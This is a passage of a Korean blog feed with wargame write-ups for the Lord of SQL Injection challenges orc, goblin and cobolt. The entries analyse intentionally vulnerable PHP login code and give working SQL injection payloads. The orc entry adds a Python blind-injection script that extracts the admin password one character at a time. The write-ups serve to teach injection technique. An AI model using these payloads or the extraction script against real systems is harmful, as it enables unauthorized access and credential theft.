      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.4 Orc</title>
    <link href="https://www.jslee.me/2019/08/15/los-write-up-04-orc/"/>
    <id>https://www.jslee.me/2019/08/15/los-write-up-04-orc/</id>
    <published>2019-08-15T02:23:17.000Z</published>
    <updated>2019-08-20T11:08:10.031Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 4번 orc 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>기본적인 Blind SQL Injection을 할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string addslashes ( string $str )</span><br></pre></td></tr></table></figure><ul><li><code>addslashes</code> 함수는 데이터베이스 질의 등에서 처리할 필요가 있는 문자(홑따옴표(‘), 겹따옴표(“), 백슬래시(\), NUL(NULL 바이트)) 앞에 백슬래시를 붙인 문자열을 반환한다.</li><li>php의 <code>addslashes</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.addslashes.php" target="_blank" rel="noopener">PHP: addslashes - Manual</a></li></ul><h4 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h4><p>4번 orc 문제같은 경우 실제 <code>pw</code>값을 알아내야 한다. 이때 화면에 <code>Hello admin</code>이라는 문자열이 출력되었는지 안 되었는지 여부에 따라 조작한 SQL문의 조건절이 참인지 거짓인지 알아낼 수 있다.</p><p>이처럼 SQL Injection이 가능하고 조작한 SQL문의 조건절이 참인지 거짓인지를 구분할 수 있는 경우 원하는 데이터를 하나씩 알아낼 수 있는데, 이를 Blind SQL Injection 이라고 한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>orc 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello admin&lt;/h2&gt;"</span>;</span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orc"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 pw를 받고, pw에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello admin&lt;/h2&gt;"</span>;</span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orc"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello admin&quot;</code> 이라는 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>SUBSTR</code> 함수 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=&apos; or id=&apos;admin&apos; and length(pw)=8-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_orc <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">length</span>(pw)=<span class="number">8</span><span class="comment">-- -'</span></span><br></pre></td></tr></table></figure><p>이는 <code>&quot;Hello admin&quot;</code>을 출력하게 만든다. 즉, <code>pw</code>는 8자리임을 알아낸 것이다.</p><p>이와 비슷한 방법으로 쿼리를 조작하면 <code>pw</code> 역시 전부 알아낼 수 있다.</p><p>하지만 이를 반복하여 8자리를 모두 알아내는 것은 사람이 하기 버거우므로 python 코드를 작성하여 풀면 편하다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request <span class="comment"># python3의 내장 라이브러리인 urllib의 request 모듈을 사용할 수 있도록 이 코드에 불러온다.</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="comment"># python3의 내장 라이브러리인 urllib의 parse 모듈에 들어있는 quote 함수를 사용할 수 있도록 이 코드에 불러온다.</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span> <span class="comment"># pw값을 저장할 문자열 변수</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>): <span class="comment"># 8자리임을 알아냈으므로 i에는 1부터 8까지 들어가도록 반복문을 구성</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>): <span class="comment"># ASCII Code에서 화면에 출력 가능한 문자의 10진수 범위는 32부터 126까지이다.</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="</span> <span class="comment"># 공격할 URL에서 변하지 않는 부분이다.</span></span><br><span class="line">        data = <span class="string">"' or id='admin' and substr(pw, 1, &#123;&#125;)='&#123;&#125;'#"</span>.format(</span><br><span class="line">            str(i), key + chr(j)) <span class="comment"># 반복문을 진행하며 계속 다른 문자가 들어갈 문자열이다.</span></span><br><span class="line">        print(data) <span class="comment"># 반복문이 한 번 돌 때마다 URL을 출력하도록 한다.</span></span><br><span class="line">        data = quote(data) <span class="comment"># URL Encoding을 해 준다.</span></span><br><span class="line">        re = urllib.request.Request(url + data) <span class="comment"># 1행에서 불러온 request 모듈의 Request 클래스를 통해 Request 객체를 만든다.</span></span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>) <span class="comment"># re 객체의 header에 User-agent를 추가한다. User-agent가 없으면 403 Forbidden 오류가 난다.</span></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"</span></span><br><span class="line">        ) <span class="comment"># re 객체의 header에 Cookie로 본인이 로그인한 클라이언트의 PHPSESSID를 추가한다. 이것이 없으면 페이지가 login_chk()에 걸려 그 다음 처리를 하지 않고 &lt;script&gt;location.href='./';&lt;/script&gt; 만 응답한다.</span></span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re) <span class="comment"># 객체를 이용해 요청을 보낸다.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>: <span class="comment"># 응답에서 "Hello admin"이라는 문자열을 찾은 경우. find()는 찾으면 시작 인덱스를, 못 찾으면 -1을 반환하는 함수이다.</span></span><br><span class="line">            key += chr(j).lower() <span class="comment"># key 변수 뒤에 ASCII Code로 j값에 해당하는 문자를 붙인다.</span></span><br><span class="line">            print(key) <span class="comment"># key를 출력한다.</span></span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># i번째 위치의 문자를 찾았으므로 반복문을 탈출한다.</span></span><br><span class="line">print(key) <span class="comment"># 반복문이 끝나면 최종적으로 찾아낸 8글자 key를 출력한다.</span></span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>295d5844</code> 를 출력한다.<br>이를 GET방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=295d5844</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 4번 orc 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.3 Goblin</title>
    <link href="https://www.jslee.me/2019/08/14/los-write-up-03-goblin/"/>
    <id>https://www.jslee.me/2019/08/14/los-write-up-03-goblin/</id>
    <published>2019-08-14T12:34:04.000Z</published>
    <updated>2019-08-20T11:08:10.031Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 3번 goblin 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>따옴표를 사용하지 않고 원하는 문자열을 <code>SELECT</code> 하도록 SQL을 조작할 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>goblin 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>no</code>를 받고, <code>no</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>no</code>에 <code>&#39;</code>, <code>&quot;</code>, ` 가 들어 있으면 <code>No Quotes ~_~</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>LIMIT</code> 구문 이용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=-1 or 1=1 limit 1,1-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_goblin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> <span class="keyword">no</span>=<span class="number">-1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p><code>LIMIT</code> 구문을 이용한 SQL Injection이 잘 이해가 되지 않으면 <strong>2번 Cobolt 문제 Write Up</strong>의 <strong>3번 Solution</strong> 부분을 참고하자.</p></li><li><p><code>CHAR</code> 함수 및 ASCII 코드 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=-1 or id=char(97, 100, 109, 105, 110)-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_goblin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> <span class="keyword">no</span>=<span class="number">-1</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="built_in">char</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>이는 ASCII에서 10진수 표기를 문자 표기로 바꿔주는 MySQL 함수인 <code>CHAR</code>를 이용하여 <code>id</code>가 <code>admin</code>인 행을 찾아 선택하도록 만든다.<br>ASCII에서, <code>&#39;a&#39;</code>=<code>97</code>, <code>&#39;d&#39;</code>=<code>100</code>, <code>&#39;m&#39;</code>=<code>109</code>, <code>&#39;i&#39;</code>=<code>105</code>, <code>&#39;n&#39;</code>=<code>110</code>이다.</p><p>따라서 이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p><code>ASCII</code>, <code>SUBSTR</code> 함수 및 ASCII 코드 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=-1 or ascii(substr(id, 1, 1))=97-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_goblin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> <span class="keyword">no</span>=<span class="number">-1</span> <span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">id</span>, <span class="number">1</span>, <span class="number">1</span>))=<span class="number">97</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>이는 ASCII에서 문자 표기자 10진수 표기로 바꿔주는 MySQL 함수인 <code>ASCII를</code> 이용하여 <code>id</code>가 <code>a</code>로 시작하는 행을 찾아 선택하도록 만든다.<br>이번에는 운이 좋아 a로 시작하는 첫번째 행이 admin이었지만, 만약 안되면 1번째 글자가 <code>a</code>, 2번째 글자가 <code>d</code>, 3번째 글자가 <code>m</code>, 4번째 글자가 <code>i</code>, 5번째 글자가 <code>n</code>인 행을 찾도록 조작하면 된다.<br>ASCII에서, <code>&#39;a&#39;</code>=<code>97</code>이다.</p><p>따라서 이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 3번 goblin 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.2 Cobolt</title>
    <link href="https://www.jslee.me/2019/08/13/los-write-up-02-cobolt/"/>
    <id>https://www.jslee.me/2019/08/13/los-write-up-02-cobolt/</id>
    <published>2019-08-13T11:47:11.000Z</published>
    <updated>2019-08-13T15:38:11.373Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 2번 cobolt 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>SQL Injection을 통해 원하는 값을 <code>SELECT</code> 하도록 조작할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h4><p>MySQL에는 <code>SELECT</code>절에 <code>LIMIT</code>이라는 구문을 이용하여 반환되는 행을 제한하는 기능이 있다.<br><a href="https://dev.mysql.com/doc/" target="_blank" rel="noopener">MySQL Documentation</a>에서 <a href="https://dev.mysql.com/doc/refman/5.7/en/select.html" target="_blank" rel="noopener">SELECT절에 대한 문서</a>를 찾아보면 다음과 같은 부분을 찾을 수 있다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> tbl <span class="keyword">LIMIT</span> <span class="number">5</span>,<span class="number">10</span>;  <span class="comment"># Retrieve rows 6-15</span></span><br></pre></td></tr></table></figure><p>즉, <code>SELECT</code> 절의 마지막에 <code>LIMIT 1,2</code> 를 붙이면 테이블에서 조건에 맞는 행 중 첫 번째(Index 0) 행부터가 아닌 <strong>두 번째</strong>(Index 1) 행부터 <strong>두 개의</strong> 행만 가져오게 된다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>cobolt 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_cobolt where id='&#123;$_GET[id]&#125;' and pw=md5('&#123;$_GET[pw]&#125;')"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"cobolt"</span>);</span><br><span class="line">  <span class="keyword">elseif</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;br&gt;You are not admin :(&lt;/h2&gt;"</span>;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1~6번 줄은 1번 문제와 동일하다.</p><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_cobolt where id='&#123;$_GET[id]&#125;' and pw=md5('&#123;$_GET[pw]&#125;')"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span 